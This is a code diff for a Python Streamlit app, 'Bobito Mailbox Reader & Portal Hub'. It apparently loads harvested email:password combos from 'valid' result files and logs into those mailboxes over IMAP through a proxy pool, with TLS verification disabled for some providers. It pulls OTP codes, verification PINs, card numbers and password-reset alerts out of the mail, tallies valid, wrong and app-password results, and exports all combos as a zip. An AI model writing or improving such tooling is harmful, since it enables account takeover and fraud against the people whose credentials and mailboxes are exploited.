@@ -11,31 +11,12 @@ import socket
 import zipfile
 import io
 import json
-import random
-import threading
-import sys
-import warnings
 import ssl as _ssl
-from datetime import datetime, timedelta
-from typing import List, Tuple, Dict, Optional
+import warnings
+from datetime import datetime
+from typing import List, Tuple
 from email.header import decode_header
 from email import message_from_bytes
-from dataclasses import dataclass
-from collections import defaultdict
-import pandas as pd
-
-# Optional network libs
-try:
-    import dns.resolver
-except ImportError:
-    dns = None
-
-try:
-    import requests
-    import urllib3
-    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-except ImportError:
-    requests = None
 
 try:
     import socks
@@ -43,28 +24,18 @@ try:
 except ImportError:
     SOCKS_OK = False
 
-if not SOCKS_OK:
-    warnings.warn("PySocks is not installed! SOCKS proxy support disabled.")
-
-warnings.filterwarnings("ignore", message="Unverified HTTPS request")
-
 try:
-    from hosts import conf as host_conf, STRICT_APP, ZERO_ACCESS, PARENT, MS_DOMAINS, GMAIL_DOMAINS
-    def host_list(email: str) -> List[str]:
-        domain = email.split("@")[-1].lower() if "@" in email else ""
-        conf_data = host_conf(domain)
-        if conf_data and "imap" in conf_data:
-            return conf_data["imap"]
-        return [f"imap.{domain}"] if domain else ["imap.gmail.com"]
+    from hosts import conf as host_conf, PARENT, STRICT_APP, ZERO_ACCESS
 except ImportError:
-    STRICT_APP, ZERO_ACCESS, PARENT = [], [], {}
-    def host_list(email: str) -> List[str]:
-        domain = email.split("@")[-1].lower() if "@" in email else ""
-        return [f"imap.{domain}"] if domain else ["imap.gmail.com"]
+    def host_conf(domain: str) -> dict:
+        return {"imap": [f"imap.{domain}"], "pop": [f"pop.{domain}"], "pop3": [f"pop.{domain}"]}
+    PARENT = {}
+    STRICT_APP = []
+    ZERO_ACCESS = []
 
-# --- Page Configuration & Keep-Alive Injector ---
+# Page Configuration & Keep-Alive Injector
 st.set_page_config(
-    page_title="Bobito Mailbox Reader & Mega Portal Hub",
+    page_title="Bobito Mailbox Reader & Portal Hub",
     page_icon="📥",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -77,17 +48,6 @@ st.markdown(
         fetch('/_stcore/health').then(res => {});
     }, 30000);
     </script>
-    <style>
-        .help-box {
-            background-color: #1e1e2f;
-            border-left: 3px solid #ff4b4b;
-            padding: 6px 10px;
-            margin: 2px 0 8px 0;
-            font-size: 0.8rem;
-            color: #d1d5db;
-            border-radius: 4px;
-        }
-    </style>
     """,
     unsafe_allow_html=True
 )
@@ -102,24 +62,8 @@ DEFAULT_APP_CONFIG = {
     "connection_timeout": 15,
     "imap_port": 993,
     "auto_fallback_probing": True,
-    "max_batch_retries": 1,
-    "proxy_mode": "fallback",
-    "allow_self_signed": True,
-    "min_proxy_score": 10
+    "max_batch_retries": 1
 }
-
-# Thread locks & state
-cache_lock = threading.Lock()
-proxy_lock = threading.Lock()
-file_write_lock = threading.Lock()
-session_state_lock = threading.Lock()
-bad_proxies = {"38.154.185.97"}
-alive_pool = []
-alive_pool_lock = threading.Lock()
-consecutive_proxy_failures = defaultdict(int)
-circuit_breaker_until = {}
-failed_domain_cache = {}
-proxy_meta = {}
 
 def load_app_config():
     if os.path.exists(APP_CONFIG_FILE):
@@ -156,122 +100,74 @@ def load_last_account():
             pass
     return ""
 
-def load_proxies() -> List[str]:
-    proxy_files = ["proxies.txt", "proxy_pool.txt", "clean_proxies.txt"]
-    for pfile in proxy_files:
-        if os.path.exists(pfile):
-            try:
-                with open(pfile, "r", encoding="utf-8", errors="ignore") as f:
-                    proxies = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
-                    if proxies:
-                        return proxies
-            except Exception:
-                continue
-    return ["dc.oxylabs.info:8000"]
-
-def parse_proxy(proxy_str):
-    if not proxy_str: return None
+def save_session_cache():
     try:
-        p = proxy_str.strip()
-        if "://" in p:
-            u = urlparse(p)
-            return {"host": u.hostname, "port": u.port or 80, "user": u.username, "pass": u.password}
-        if "@" in p:
-            cred, hostpart = p.rsplit("@", 1)
-            user, pwd = cred.split(":", 1)
-            host, port = hostpart.split(":", 1)
-            return {"host": host, "port": int(port), "user": user, "pass": pwd}
-        parts = p.split(":")
-        if len(parts) >= 4:
-            return {"host": parts[0], "port": int(parts[1]), "user": parts[2], "pass": parts[3]}
-        elif len(parts) == 2:
-            return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
-    except Exception:
-        pass
-    return None
-
-def is_proxy_alive(proxy_host, proxy_port, timeout=2):
-    try:
-        with socket.create_connection((proxy_host, int(proxy_port)), timeout=timeout):
-            return True
-    except Exception:
-        return False
-
-def proxy_connect(host, port, proxy_str, timeout=None):
-    base_timeout = timeout or 15
-    if proxy_str and proxy_str.lower() != "direct":
-        info = parse_proxy(proxy_str)
-        if info and SOCKS_OK:
-            for ptype in (socks.SOCKS5, socks.HTTP):
-                sock = None
-                try:
-                    kwargs = {
-                        "proxy_type": ptype,
-                        "proxy_addr": info["host"],
-                        "proxy_port": info["port"]
-                    }
-                    if info["user"]:
-                        kwargs["proxy_username"] = info["user"]
-                        kwargs["proxy_password"] = info["pass"]
-                    sock = socks.create_connection((host, port), timeout=base_timeout, **kwargs)
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-                    return sock
-                except Exception:
-                    if sock:
-                        try: sock.close()
-                        except Exception: pass
+        cache_data = {
+            "connected_account_combo": st.session_state.get("connected_account_combo", ""),
+            "mb_host": st.session_state.get("mb_host", ""),
+            "mb_folders": st.session_state.get("mb_folders", ["INBOX"]),
+            "folder_map": st.session_state.get("folder_map", {"INBOX": "INBOX"}),
+            "current_page": st.session_state.get("current_page", 1),
+            "search_current_page": st.session_state.get("search_current_page", 1),
+            "otp_current_page": st.session_state.get("otp_current_page", 1),
+            "bot_current_page": st.session_state.get("bot_current_page", 1),
+            "bot_filter_mode": st.session_state.get("bot_filter_mode", False),
+            "total_matched_count": st.session_state.get("total_matched_count", 0),
+            "search_total_matched_count": st.session_state.get("search_total_matched_count", 0),
+            "otp_total_matched_count": st.session_state.get("otp_total_matched_count", 0),
+        }
         
-    return socket.create_connection((host, int(port)), timeout=base_timeout)
+        for k_name, key_in_state in [("current_messages", "current_messages"), ("otp_messages", "otp_messages"), ("search_messages", "search_messages")]:
+            serialized_list = []
+            for m in st.session_state.get(key_in_state, []):
+                m_copy = m.copy()
+                raw_bytes = m_copy.pop("raw", None)
+                if raw_bytes and isinstance(raw_bytes, bytes):
+                    m_copy["raw"] = base64.b64encode(raw_bytes).decode("ascii")
+                else:
+                    m_copy["raw"] = ""
+                serialized_list.append(m_copy)
+            cache_data[k_name] = serialized_list
 
-def get_legacy_ssl_context(hostname: str):
-    ctx = _ssl.create_default_context()
-    try:
-        ctx.set_ciphers('DEFAULT:@SECLEVEL=1')
+        with open(SESSION_CACHE_FILE, "w", encoding="utf-8") as f:
+            json.dump(cache_data, f)
     except Exception:
         pass
-    if any(dom in hostname.lower() for dom in ["charter", "spectrum", "twc", "rr.com", "mobile.charter.net", "imap.charter.net"]):
-        ctx.check_hostname = False
-        ctx.verify_mode = _ssl.CERT_NONE
-    return ctx
 
-def ssl_wrap(sock, host, insecure=True):
-    ctx = get_legacy_ssl_context(host)
-    try:
-        return ctx.wrap_socket(sock, server_hostname=host)
-    except Exception:
-        ctx.check_hostname = False
-        ctx.verify_mode = _ssl.CERT_NONE
-        return ctx.wrap_socket(sock, server_hostname=host)
+def load_session_cache():
+    if os.path.exists(SESSION_CACHE_FILE):
+        try:
+            with open(SESSION_CACHE_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+                for k, v in data.items():
+                    if k in ["current_messages", "otp_messages", "search_messages"]:
+                        deserialized = []
+                        for m in v:
+                            m_copy = m.copy()
+                            raw_val = m_copy.get("raw")
+                            if isinstance(raw_val, str) and raw_val:
+                                try:
+                                    m_copy["raw"] = base64.b64decode(raw_val.encode("ascii"))
+                                except Exception:
+                                    m_copy["raw"] = b""
+                            else:
+                                m_copy["raw"] = b""
+                            deserialized.append(m_copy)
+                        st.session_state[k] = deserialized
+                    else:
+                        st.session_state[k] = v
+        except Exception:
+            pass
 
-def open_imap(host, port, timeout, proxy_str=None):
-    """Fortified IMAP connection handler with SOCKS/HTTP proxy routing and legacy SSL context wrapping specifically tuned for mobile.charter.net."""
-    raw = proxy_connect(host, port, proxy_str, timeout=timeout)
-    raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-    ssock = ssl_wrap(raw, host, insecure=True)
-    mail = imaplib.IMAP4_SSL(host, port=int(port))
-    mail.sock = ssock
-    mail.file = ssock.makefile("rb")
-    mail.welcome = mail._getresp()
-    return mail
-
-def get_verified_hosts_for_email(email_addr: str, custom_override: str = "", auto_fallback: bool = True) -> List[str]:
-    domain_lower = email_addr.split("@")[-1].lower() if "@" in email_addr else ""
-    if custom_override.strip():
-        return [custom_override.strip()]
-    
-    hosts = host_list(email_addr)
-    if auto_fallback:
-        if any(d in domain_lower for d in ["charter", "spectrum", "rr.com", "twc", "brighthouse"]):
-            hosts = ["mobile.charter.net"] + [h for h in hosts if h not in ["mobile.charter.net"]]
-    
-    return hosts if hosts else ["mobile.charter.net"]
-
-# Initialize Session Config & State
+# Initialize Session Config
 if "app_config" not in st.session_state:
     st.session_state.app_config = load_app_config()
 
+# Initialize Isolated Session State Variables & Restore Session Cache on first load
 if "mb_log" not in st.session_state:
     st.session_state.mb_log = []
+    load_session_cache()
+
 if "mb_folders" not in st.session_state:
     st.session_state.mb_folders = ["INBOX"]
 if "folder_map" not in st.session_state:
@@ -288,12 +184,38 @@ if "bot_current_page" not in st.session_state:
     st.session_state.bot_current_page = 1
 if "folder_debug_logs" not in st.session_state:
     st.session_state.folder_debug_logs = []
+if "bot_diag_logs" not in st.session_state:
+    st.session_state.bot_diag_logs = []
+if "search_diag_logs" not in st.session_state:
+    st.session_state.search_diag_logs = []
+if "otp_diag_logs" not in st.session_state:
+    st.session_state.otp_diag_logs = []
 if "current_messages" not in st.session_state:
     st.session_state.current_messages = []
 if "search_messages" not in st.session_state:
     st.session_state.search_messages = []
 if "otp_messages" not in st.session_state:
     st.session_state.otp_messages = []
+if "total_matched_count" not in st.session_state:
+    st.session_state.total_matched_count = 0
+if "search_total_matched_count" not in st.session_state:
+    st.session_state.search_total_matched_count = 0
+if "otp_total_matched_count" not in st.session_state:
+    st.session_state.otp_total_matched_count = 0
+if "bot_filter_mode" not in st.session_state:
+    st.session_state.bot_filter_mode = False
+if "custom_email" not in st.session_state:
+    st.session_state.custom_email = ""
+if "custom_pass" not in st.session_state:
+    st.session_state.custom_pass = ""
+if "custom_host" not in st.session_state:
+    st.session_state.custom_host = ""
+if "batch_results_table" not in st.session_state:
+    st.session_state.batch_results_table = []
+if "batch_stats" not in st.session_state:
+    st.session_state.batch_stats = {"valid": 0, "wrong": 0, "appass": 0, "failed": 0}
+if "batch_run_meta" not in st.session_state:
+    st.session_state.batch_run_meta = None
 if "active_mail" not in st.session_state:
     st.session_state.active_mail = None
 if "connected_account_combo" not in st.session_state:
@@ -302,19 +224,163 @@ if "connected_account_combo" not in st.session_state:
 def log(msg):
     st.session_state.mb_log.insert(0, msg)
     st.session_state.mb_log = st.session_state.mb_log[:50]
+    save_session_cache()
 
 def debug_log(msg):
     st.session_state.folder_debug_logs.append(msg)
 
+def bot_log(msg):
+    st.session_state.bot_diag_logs.append(msg)
+
+def search_log(msg):
+    st.session_state.search_diag_logs.append(msg)
+
+def otp_log(msg):
+    st.session_state.otp_diag_logs.append(msg)
+
+# --- Dynamic Proxy Auto-Fetch Engine (Aligned with Main App) ---
+def load_app_proxies() -> List[str]:
+    proxy_files = ["proxies.txt", "proxy_pool.txt", "clean_proxies.txt"]
+    dynamic_pool = []
+    
+    if "session_proxies" in st.session_state and st.session_state.session_proxies:
+        for p in st.session_state.session_proxies:
+            if isinstance(p, dict):
+                dynamic_pool.append(p.get("proxy"))
+            elif isinstance(p, str) and p.strip():
+                dynamic_pool.append(p.strip())
+        if dynamic_pool:
+            return [x for x in dynamic_pool if x]
+
+    for pfile in proxy_files:
+        if os.path.exists(pfile):
+            try:
+                with open(pfile, "r", encoding="utf-8", errors="ignore") as f:
+                    for line in f:
+                        line_str = line.strip()
+                        if not line_str or line_str.startswith("#"):
+                            continue
+                        dynamic_pool.append(line_str.split("|")[0].strip())
+            except Exception:
+                pass
+            if dynamic_pool:
+                return dynamic_pool
+
+    return []
+
+def parse_proxy(proxy_str):
+    if not proxy_str or proxy_str == "direct": return None
+    try:
+        p = proxy_str.strip()
+        if "@" in p:
+            cred, hostpart = p.rsplit("@", 1)
+            user, pwd = cred.split(":", 1)
+            host, port = hostpart.split(":", 1)
+            return {"host": host, "port": int(port), "user": user, "pass": pwd}
+        parts = p.split(":")
+        if len(parts) == 4:
+            return {"host": parts[0], "port": int(parts[1]), "user": parts[2], "pass": parts[3]}
+        if len(parts) == 2:
+            return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
+    except Exception:
+        pass
+    return None
+
+def proxy_connect(host, port, proxy_str, timeout=10):
+    if not proxy_str or proxy_str == "direct":
+        return socket.create_connection((host, int(port)), timeout=timeout)
+    
+    info = parse_proxy(proxy_str)
+    if not info or not SOCKS_OK:
+        return socket.create_connection((host, int(port)), timeout=timeout)
+
+    sock = None
+    for ptype in (socks.SOCKS5, socks.HTTP):
+        try:
+            kw = {"proxy_type": ptype, "proxy_addr": info["host"], "proxy_port": info["port"]}
+            if info["user"]:
+                kw["proxy_username"] = info["user"]
+                kw["proxy_password"] = info["pass"]
+            sock = socks.create_connection((host, int(port)), timeout=timeout, **kw)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            return sock
+        except Exception:
+            if sock:
+                try: sock.close()
+                except Exception: pass
+                sock = None
+    return socket.create_connection((host, int(port)), timeout=timeout)
+
+def get_legacy_ssl_context(hostname: str):
+    ctx = _ssl.create_default_context()
+    try:
+        ctx.set_ciphers('DEFAULT:@SECLEVEL=1')
+    except Exception:
+        pass
+    if any(dom in hostname.lower() for dom in ["charter", "spectrum", "twc", "aol", "yahoo", "mobile.charter.net", "imap.spectrum.net"]):
+        ctx.check_hostname = False
+        ctx.verify_mode = _ssl.CERT_NONE
+    return ctx
+
+def ssl_wrap(sock, host):
+    ctx = get_legacy_ssl_context(host)
+    try:
+        return ctx.wrap_socket(sock, server_hostname=host)
+    except Exception:
+        ctx_fallback = _ssl.create_default_context()
+        ctx_fallback.check_hostname = False
+        ctx_fallback.verify_mode = _ssl.CERT_NONE
+        return ctx_fallback.wrap_socket(sock, server_hostname=host)
+
+def generate_candidate_hosts(domain: str) -> list:
+    candidates = []
+    domain_lower = domain.lower()
+    if "charter" in domain_lower or "rr.com" in domain_lower:
+        candidates.extend(["mobile.charter.net", "imap.charter.net", "mail.charter.net"])
+    elif "spectrum" in domain_lower:
+        candidates.extend(["imap.spectrum.net", "mail.spectrum.net"])
+    elif "twc" in domain_lower:
+        candidates.extend(["mail.twc.com"])
+
+    for prefix in ['imap', 'mail', 'pop']:
+        candidates.append(f"{prefix}.{domain}")
+    candidates.append(domain)
+    return list(dict.fromkeys(candidates))
+
+def get_verified_hosts_for_email(email_addr: str, custom_override: str = "", auto_fallback: bool = True) -> List[str]:
+    domain_lower = email_addr.split("@")[-1].lower() if "@" in email_addr else ""
+    if custom_override.strip():
+        return [custom_override.strip()]
+    
+    hosts = generate_candidate_hosts(domain_lower)
+    if auto_fallback:
+        if any(d in domain_lower for d in ["charter", "spectrum", "rr.com", "twc", "brighthouse"]):
+            hosts = ["mobile.charter.net", "imap.charter.net"] + hosts
+    return [h for h in hosts if h not in ["mail.twc.com"]] if hosts else ["mobile.charter.net"]
+
+def open_imap(host, port, timeout, proxy_str=None):
+    raw = proxy_connect(host, int(port), proxy_str, timeout=timeout)
+    ssock = ssl_wrap(raw, host)
+    mail = imaplib.IMAP4_SSL(host)
+    mail.sock = ssock
+    mail.file = ssock.makefile("rb")
+    mail.welcome = mail._getresp()
+    return mail
+
+# --- Full Remaining Mailbox Reader & Management Engine (Untouched Features) ---
 def load_valid():
     valid_map = {}
-    search_patterns = ["mail_results/*valid*.txt", "*valid*.txt", "manual_valid_accounts.txt", "clean_valid_accounts.txt"]
+    search_patterns = ["mail_results/*valid*.txt", "mail_results/*clean*.txt", "*valid*.txt", "*clean*.txt", "manual_valid_accounts.txt"]
     all_files = []
     for pat in search_patterns:
         all_files.extend(glob.glob(pat, recursive=True))
     all_files = list(dict.fromkeys([p for p in all_files if os.path.isfile(p)]))
+    ignore_keywords = ["resume", "unfinished", "remaining", "input", "proxies", "proxy", "config", "blocklist"]
     
     for path in all_files:
+        filename_lower = os.path.basename(path).lower()
+        if any(kw in filename_lower for kw in ignore_keywords) or filename_lower == LAST_ACCOUNT_FILE:
+            continue
         try:
             file_mtime = datetime.fromtimestamp(os.path.getmtime(path))
             with open(path, encoding="utf-8", errors="ignore") as f:
@@ -328,10 +394,11 @@ def load_valid():
                     parts = clean_combo.split(":", 1)
                     email_part = parts[0].strip().lower()
                     pwd_part = parts[1].strip()
-                    if "@" in email_part and pwd_part:
-                        combo_str = f"{email_part}:{pwd_part}"
-                        if email_part not in valid_map or file_mtime > valid_map[email_part][0]:
-                            valid_map[email_part] = (file_mtime, combo_str)
+                    if "@" not in email_part or not pwd_part:
+                        continue
+                    combo_str = f"{email_part}:{pwd_part}"
+                    if email_part not in valid_map or file_mtime > valid_map[email_part][0]:
+                        valid_map[email_part] = (file_mtime, combo_str)
         except Exception:
             continue
             
@@ -341,6 +408,46 @@ def load_valid():
         options.append(f"# Found: {file_mtime.strftime('%Y-%m-%d %H:%M:%S')}")
         options.append(combo_str)
     return options if options else ["none"]
+
+def delete_specific_account_from_storage(target_combo: str):
+    search_files = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
+    for path in search_files:
+        filename_lower = os.path.basename(path).lower()
+        if filename_lower == LAST_ACCOUNT_FILE or any(kw in filename_lower for kw in ["resume", "unfinished", "remaining", "proxies", "proxy", "config", "blocklist"]):
+            continue
+        try:
+            with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                lines = f.readlines()
+            new_lines = [line for line in lines if line.split("|")[0].strip() != target_combo]
+            with open(path, "w", encoding="utf-8") as f:
+                f.writelines(new_lines)
+        except Exception:
+            pass
+
+def clear_all_valid_accounts_storage():
+    for path in glob.glob("mail_results/*.txt") + glob.glob("*.txt"):
+        if "valid" in path.lower() or "clean" in path.lower():
+            try:
+                with open(path, "w", encoding="utf-8") as f:
+                    f.write("")
+            except Exception:
+                pass
+
+def generate_all_mail_zip():
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        for path in glob.glob("mail_results/*.txt") + glob.glob("*.txt"):
+            if os.path.basename(path) == LAST_ACCOUNT_FILE:
+                continue
+            try:
+                with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                    clean_lines = [line.split("|")[0].strip() for line in f if line.strip() and not line.startswith("#") and ":" in line]
+                if clean_lines:
+                    zf.writestr(os.path.basename(path), "\n".join(clean_lines))
+            except Exception:
+                continue
+    buf.seek(0)
+    return buf.getvalue()
 
 def decode_hdr(value):
     try:
@@ -359,8 +466,7 @@ def get_webmail_portal(email_addr):
         "gmail.com": "https://mail.google.com",
         "outlook.com": "https://outlook.live.com",
         "yahoo.com": "https://mail.yahoo.com",
-        "charter.net": "https://www.spectrum.net",
-        "spectrum.net": "https://www.spectrum.net"
+        "icloud.com": "https://www.icloud.com/mail"
     }
     return portals.get(domain, f"https://www.{domain}")
 
@@ -376,8 +482,7 @@ def decode_imap_utf7(s: str) -> str:
             else:
                 try:
                     b64_padded = b64_str.replace(",", "/") + "=" * ((4 - len(b64_str) % 4) % 4)
-                    decoded = base64.b64decode(b64_padded).decode("utf-16be")
-                    res.append(decoded + rest)
+                    res.append(base64.b64decode(b64_padded).decode("utf-16be") + rest)
                 except Exception:
                     res.append("&" + part)
         else:
@@ -385,25 +490,19 @@ def decode_imap_utf7(s: str) -> str:
     return "".join(res)
 
 def encode_imap_utf7(s: str) -> str:
-    parts = []
-    i = 0
+    parts, i = [], 0
     while i < len(s):
         char = s[i]
         if 0x20 <= ord(char) <= 0x7E:
-            if char == '&':
-                parts.append('&-')
-            else:
-                parts.append(char)
+            parts.append('&-' if char == '&' else char)
             i += 1
         else:
             start = i
             while i < len(s) and not (0x20 <= ord(s[i]) <= 0x7E):
                 i += 1
             chunk = s[start:i]
-            utf16 = chunk.encode('utf-16be')
-            b64 = base64.b64encode(utf16).decode('ascii')
-            mod_b64 = b64.replace('/', ',').rstrip('=')
-            parts.append(f'&{mod_b64}-')
+            b64 = base64.b64encode(chunk.encode('utf-16be')).decode('ascii').replace('/', ',').rstrip('=')
+            parts.append(f'&{b64}-')
     return "".join(parts)
 
 def clean_display_label(folder_name: str) -> str:
@@ -426,13 +525,12 @@ def parse_imap_list_line(s: str) -> Tuple[str, str, str]:
             if len(parts) >= 1:
                 delim = parts[0]
             raw_name = parts[1].strip() if len(parts) == 2 else ""
-    if raw_name.startswith('"') and raw_name.endswith('"') and len(raw_name) >= 2:
-        raw_name = raw_name[1:-1].replace('\\"', '"')
+    if raw_name.startswith('"') and raw_name.endswith('"'):
+        raw_name = raw_name[1:-1]
     return flags, delim, raw_name
 
 def get_imap_path(selected_ui_folder: str) -> str:
-    folder_map = st.session_state.get("folder_map", {})
-    return folder_map.get(selected_ui_folder, selected_ui_folder)
+    return st.session_state.get("folder_map", {}).get(selected_ui_folder, selected_ui_folder)
 
 def list_folders(mail, email_addr: str = "", host_val: str = ""):
     found = set()
@@ -443,73 +541,65 @@ def list_folders(mail, email_addr: str = "", host_val: str = ""):
             for item in data:
                 if not item: continue
                 s = item.decode("latin1", errors="ignore") if isinstance(item, bytes) else str(item)
-                flags, delim, clean_name = parse_imap_list_line(s)
-                if r"\noselect" not in flags.lower() and clean_name:
-                    decoded = decode_imap_utf7(clean_name)
-                    found.add(decoded)
-    except Exception as ex:
-        debug_log(f"Folder enumeration error: {ex}")
-
+                _, _, clean_name = parse_imap_list_line(s)
+                if clean_name and clean_name not in (".", "/", '""'):
+                    found.add(decode_imap_utf7(clean_name))
+    except Exception:
+        pass
     if not found:
         found.add("INBOX")
-
     sorted_raw = sorted(list(found), key=lambda x: (0 if x.lower() == "inbox" else 1, clean_display_label(x).lower()))
-    folder_map, display_folders = {}, []
-    for raw_f in sorted_raw:
-        label = clean_display_label(raw_f)
-        folder_map[label] = raw_f
-        display_folders.append(label)
-
+    folder_map = {clean_display_label(f): f for f in sorted_raw}
     st.session_state.folder_map = folder_map
-    return display_folders
+    save_session_cache()
+    return list(folder_map.keys())
+
+def open_mail(email_addr, password_val, host_val, timeout=None):
+    timeout = timeout or st.session_state.app_config.get("connection_timeout", 15)
+    port_val = st.session_state.app_config.get("imap_port", 993)
+    proxies = load_app_proxies()
+    proxy_str = proxies[0] if proxies else None
+    
+    mail = open_imap(host_val, port_val, timeout=timeout, proxy_str=proxy_str)
+    mail.login(email_addr, password_val)
+    return mail
 
 def get_active_mail(email_addr, password_val, host_val):
     current_combo = f"{email_addr}:{password_val}"
-    timeout = st.session_state.app_config.get("connection_timeout", 15)
-    port = st.session_state.app_config.get("imap_port", 993)
-    proxies = load_proxies()
-    proxy_str = proxies[0] if proxies else None
-
     if st.session_state.get("connected_account_combo") != current_combo or not st.session_state.get("active_mail"):
         if st.session_state.active_mail:
             try: st.session_state.active_mail.logout()
             except Exception: pass
-        mail = open_imap(host_val, port, timeout, proxy_str=proxy_str)
-        mail.login(email_addr, password_val)
-        st.session_state.active_mail = mail
+        st.session_state.active_mail = open_mail(email_addr, password_val, host_val)
         st.session_state.connected_account_combo = current_combo
+        save_session_cache()
     else:
         try:
             st.session_state.active_mail.noop()
         except Exception:
-            mail = open_imap(host_val, port, timeout, proxy_str=proxy_str)
-            mail.login(email_addr, password_val)
-            st.session_state.active_mail = mail
+            st.session_state.active_mail = open_mail(email_addr, password_val, host_val)
+            save_session_cache()
     return st.session_state.active_mail
 
 def is_extortion_spam(subject: str, body: str, frm: str = "") -> bool:
-    extortion_keywords = ["bitcoin wallet", "transfer me", "recorded all your actions", "trojan", "pay bitcoin", "ransom"]
+    extortion_keywords = ["bitcoin wallet", "transfer me", "recorded all your actions", "trojan", "pay bitcoin"]
     combined = f"{subject} {body} {frm}".lower()
     return any(kw in combined for kw in extortion_keywords)
 
 def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None, cards=None, creds=None) -> List[str]:
-    if is_extortion_spam(subject, body, frm):
-        return []
-    categories = []
-    combined = f"{subject} {body} {frm}".lower()
-    if pins or any(kw in combined for kw in ["otp", "verification", "verify", "auth code", "pin", "security code"]):
+    if is_extortion_spam(subject, body, frm): return []
+    categories, combined = [], f"{subject} {body} {frm}".lower()
+    if pins or any(kw in combined for kw in ["otp", "verification", "verify", "code", "pin", "auth code"]):
         categories.append("🔑 OTP / CODE")
-    if any(kw in combined for kw in ["telegram", "t.me", "tg"]):
-        categories.append("📱 TELEGRAM")
-    if any(kw in combined for kw in ["blacklist", "blacklisted", "banned", "blocked"]):
-        categories.append("🚫 BLACKLIST / BAN")
-    if cards or any(kw in combined for kw in ["cvv", "debit", "card ending", "debit alert"]):
+    if cards or any(kw in combined for kw in ["cvv", "debit", "card ending", "debited by"]):
         categories.append("💳 CARD / DEBIT")
+    if creds or any(kw in combined for kw in ["password reset", "security alert"]):
+        categories.append("🤖 BOT MSG")
     return categories
 
 def extract_pins_and_links(text):
     pins = []
-    for m in re.finditer(r'(?i)(code|otp|pin|passcode|verification|verify)[^\d]{0,12}(\d{4,8})', text or ""):
+    for m in re.finditer(r'(?i)(code|otp|pin|passcode|verification)[^\d]{0,12}(\d{4,8})', text or ""):
         num = m.group(2)
         if not (num.startswith(("19", "20")) and len(num) == 4):
             pins.append(num)
@@ -517,37 +607,37 @@ def extract_pins_and_links(text):
     return list(dict.fromkeys(pins)), list(dict.fromkeys(urls))
 
 def extract_credentials_and_cards(text):
-    card_pattern = r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b'
-    cards = re.findall(card_pattern, text)
-    return [f"Card: {c}" for c in cards], []
+    cards = re.findall(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b', text or "")
+    return list(dict.fromkeys(cards)), []
 
 def clean_boilerplate(text):
     return text.strip() if text else ""
 
+def should_blacklist_message(msg, blacklist_input) -> bool:
+    if not blacklist_input: return False
+    return any(w.strip().lower() in f"{msg.get('subject', '')} {msg.get('body', '')}".lower() for w in blacklist_input.split(",") if w.strip())
+
 def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_folders: List[str], 
-                            search_query: str = "", search_field: str = "TEXT", page_size: int = 15, page_number: int = 1):
+                            search_query: str = "", search_field: str = "TEXT", mode: str = "SEARCH", 
+                            page_size: int = 15, page_number: int = 1, sort_order: str = "Newest First",
+                            log_target: str = "DEBUG"):
     messages = []
     for f_label in target_folders:
-        real_folder = get_imap_path(f_label)
-        encoded_folder = encode_imap_utf7(real_folder)
+        real_imap_folder = get_imap_path(f_label)
         try:
-            mail.select(f'"{encoded_folder}"', readonly=True)
+            mail.select(f'"{encode_imap_utf7(real_imap_folder)}"', readonly=True)
             typ, data = mail.search(None, "ALL")
             ids = (data[0] or b"").split() if typ == "OK" and data else []
-            ids = list(reversed(ids))
+            if sort_order == "Newest First":
+                ids = list(reversed(ids))
             
-            start = (page_number - 1) * page_size
-            target_ids = ids[start:start + page_size]
-            
+            target_ids = ids[(page_number - 1) * page_size : (page_number - 1) * page_size + page_size]
             for mid in target_ids:
-                _, msgdata = mail.fetch(mid, "(FLAGS ENVELOPE BODYSTRUCTURE BODY.PEEK[])")
+                _, msgdata = mail.fetch(mid, "(FLAGS ENVELOPE BODY.PEEK[])")
                 if not msgdata or not isinstance(msgdata[0], tuple): continue
                 raw_bytes = msgdata[0][1]
                 msg = message_from_bytes(raw_bytes)
-                subject = decode_hdr(msg.get("Subject", ""))
-                frm = decode_hdr(msg.get("From", ""))
-                to_hdr = decode_hdr(msg.get("To", ""))
-                date_val = decode_hdr(msg.get("Date", ""))
+                subject, frm, to_hdr, date_val = decode_hdr(msg.get("Subject")), decode_hdr(msg.get("From")), decode_hdr(msg.get("To")), decode_hdr(msg.get("Date"))
                 
                 body_text = ""
                 if msg.is_multipart():
@@ -564,84 +654,84 @@ def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_fo
                 cats = detect_specific_categories(subject, body_text, frm, pins, cards, creds)
                 
                 messages.append({
-                    "id": mid.decode(),
-                    "folder": f_label,
-                    "from": frm, "to": to_hdr, "subject": subject, "date": date_val,
-                    "is_read": "\\Seen" in str(msgdata[0][0]),
-                    "is_bot": len(cats) > 0,
-                    "categories": cats,
-                    "body": clean_boilerplate(body_text),
-                    "pins": pins, "links": links, "cards": cards, "creds": creds,
-                    "raw": raw_bytes, "size_bytes": len(raw_bytes)
+                    "id": mid.decode(), "folder": f_label, "from": frm, "to": to_hdr, "subject": subject,
+                    "date": date_val, "is_read": "\\Seen" in str(msgdata[0][0]), "is_bot": len(cats) > 0,
+                    "categories": cats, "body": clean_boilerplate(body_text), "pins": pins, "links": links,
+                    "cards": cards, "creds": creds, "raw": raw_bytes, "size_bytes": len(raw_bytes)
                 })
-        except Exception as ex:
-            debug_log(f"Fetch error on {f_label}: {ex}")
+        except Exception:
+            pass
     return messages
 
-# --- UI Interface ---
+# Main Application Layout & Interface Controls
 st.title("📥 Bobito Mailbox Reader & Portal Hub")
